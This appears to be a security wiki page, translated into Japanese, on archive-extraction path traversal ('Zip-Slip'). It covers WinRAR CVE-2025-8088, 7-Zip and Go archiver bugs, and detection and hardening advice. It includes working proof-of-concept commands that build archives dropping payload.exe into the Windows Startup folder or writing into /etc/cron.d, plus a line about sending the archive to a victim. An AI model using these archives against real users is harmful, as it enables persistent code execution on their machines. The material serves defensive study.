# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概要

多くの archive format（ZIP、RAR、TAR、7-ZIP など）では、各エントリに独自の **internal path** を持たせることができます。extract utility がそのパスを無条件に信頼すると、`..` や **absolute path**（例: `C:\Windows\System32\`）を含む細工された filename が、ユーザーが指定した directory の外部に書き込まれます。
この種の脆弱性は、一般に *Zip-Slip* または **archive extraction path traversal** と呼ばれています。<sup>[[6]](#references)</sup>

影響は任意のファイルの上書きから、Windows の *Startup* folder のような **auto-run** location に payload を配置して直接 **remote code execution (RCE)** を達成することまで、多岐にわたります。

## Root Cause

1. Attacker は、1 つ以上の file header に以下を含む archive を作成します。
* Relative traversal sequences（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
* Absolute paths（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
* または、target dir の外部を指す細工された **symlinks**（*nix* の ZIP/TAR で一般的）。
2. Victim は、embedded path を信頼する（または symlinks に従う）脆弱な tool で archive を extract します。この tool は、パスを sanitise したり、選択された directory 配下への extraction を強制したりしません。
3. ファイルが attacker-controlled location に書き込まれ、次回 system または user がそのパスを trigger した際に実行または load されます。

### .NET `Path.Combine` + `ZipArchive` traversal

一般的な .NET の anti-pattern は、意図した destination と **user-controlled** な `ZipArchiveEntry.FullName` を結合し、パスを normalisation せずに extraction することです。<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` が `..\\` で始まる場合は traversal が発生します。**absolute path** の場合、左側のコンポーネントが完全に破棄され、extract の identity として **arbitrary file write** が発生します。
- scheduled scanner によって監視されている sibling の `app` directory に書き込むための proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
その ZIP を監視対象の inbox に配置すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外部への traversal が可能であることが証明され、後続の primitive（例：DLL hijacks）が可能になります。

## 実際の事例 – WinRAR ≤ 7.12（CVE-2025-8088）

Windows 版 WinRAR（`rar` / `unrar` CLI、DLL、portable source を含む）は、extraction 中の filenames の検証に失敗していました。
次のような entry を含む悪意のある RAR archive：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
は最終的に選択した出力ディレクトリの**外側**にあり、ユーザーの *Startup* フォルダー内に配置されることになります。ログオン後、Windows はそこに存在するすべてのファイルを自動的に実行するため、*永続的な* RCE が可能になります。<sup>[[5]](#references)</sup>

### PoC Archive の作成（Linux/Mac）
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
使用したオプション:
* `-ep`  – file paths を指定どおりに保存する（先頭の `./` を**削除しない**）。

`evil.rar` を被害者に送り、脆弱な WinRAR build で extract するよう指示します。

### 実環境で確認された Exploitation

ESET は、CVE-2025-8088 を悪用する RAR archive を添付し、カスタマイズされた backdoor の展開や ransomware operations の促進を行う RomCom（Storm-0978/UNC2596）の spear-phishing campaigns を報告しました。<sup>[[5]](#references)</sup>

## より新しい事例（2024–2025）

### 7-Zip ZIP symlink traversal → RCE（CVE-2025-11001 / ZDI-25-949）
* **Bug**: **symbolic links** である ZIP entries が extraction 中に dereference され、attackers が destination directory の外へ抜け出して arbitrary paths を overwrite できました。User interaction は archive の *opening/extracting* だけです。<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09（Windows および Linux builds）。**25.00**（July 2025）以降で修正済み。
* **Impact path**: `Start Menu/Programs/Startup` または service-run locations を overwrite → 次回の logon または service restart 時に code が実行されます。
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
patched build では `/etc/cron.d` は touch されず、symlink は `/tmp/target` 内の link として extract されます。

### Go mholt/archiver Unarchive() Zip-Slip（CVE-2025-3445）
* **Bug**: `archiver.Unarchive()` は `../` および symlinked ZIP entries に従い、`outputDir` の外へ write します。<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1（project は現在 deprecated）。
* **Fix**: `mholt/archives` ≥ 0.1.0 に switch するか、write 前に canonical-path checks を implement します。
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – archive entries を list し、`../`、`..\\`、*absolute paths*（`/`、`C:`）を含む name、または target が extraction dir の外部にある *symlink* type の entries に flag を立てます。
* **Canonicalisation** – `realpath(join(dest, name))` が引き続き `dest` で始まることを確認します。それ以外は reject します。<sup>[[3]](#references)</sup>
* **Sandbox extraction** – *safe* extractor（例: `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）を使用して disposable directory に decompress し、resulting paths が directory 内に留まっていることを verify します。
* **Endpoint monitoring** – archive が WinRAR/7-Zip などで opened された直後に、`Startup`/`Run`/`cron` locations へ新しい executables が write された場合に alert を出します。

## Mitigation & Hardening

1. **Extractor を update** – WinRAR 7.13+ および 7-Zip 25.00+ は path/symlink sanitisation を implement しています。両方の tools とも auto-update はありません。
2. 可能な場合は “**Do not extract paths**” / “**Ignore paths**” を指定して archive を extract します。
3. Unix では extraction 前に privileges を drop し、**chroot/namespace** を mount します。Windows では **AppContainer** または sandbox を使用します。
4. custom code を write する場合は、create/write **前に** `realpath()`/`PathCanonicalize()` で normalise し、destination から escape する entry は reject します。

## その他の Affected / Historical Cases

* 2018 – Snyk による大規模な *Zip-Slip* advisory。多数の Java/Go/JS libraries に影響しました。<sup>[[6]](#references)</sup>
* 2023 – `-ao` merge 中の同様の traversal である 7-Zip CVE-2023-4011。
* 2025 – HashiCorp `go-slug`（CVE-2025-0377）。slugs における TAR extraction traversal（v1.2 で patch）。<sup>[[7]](#references)</sup>
* write 前に `PathCanonicalize` / `realpath` を call しない custom extraction logic 全般。

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
